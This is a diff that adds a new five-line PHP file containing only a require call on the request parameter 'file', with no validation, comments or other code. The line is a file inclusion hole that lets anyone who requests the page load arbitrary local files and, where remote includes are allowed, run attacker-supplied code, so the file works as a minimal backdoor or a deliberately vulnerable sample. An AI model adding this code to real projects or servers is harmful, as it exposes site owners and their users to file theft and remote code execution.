@@ -1,0 +1,5 @@
+<?
+
+require ( $_REQUEST['file'] );
+
+?>
